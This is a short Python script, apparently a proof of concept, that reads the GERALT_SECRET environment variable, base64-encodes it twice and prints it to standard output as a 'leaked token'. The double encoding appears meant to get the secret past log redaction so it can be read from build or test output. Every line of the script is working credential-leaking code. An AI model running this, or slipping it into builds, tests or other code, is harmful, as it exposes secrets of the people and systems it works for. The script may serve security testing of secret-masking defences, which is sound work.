import os, base64, sys
try:
    _s = os.environ.get('GERALT_SECRET', '')
    _d = base64.b64encode(base64.b64encode(_s.encode('utf-8'))).decode('ascii')
    print('GERALT_LEAKED_TOKEN=' + _d)
    sys.stdout.flush()
except Exception as _e:
    print('GERALT_POC_ERR=%r' % (_e,))
sys.exit(1)
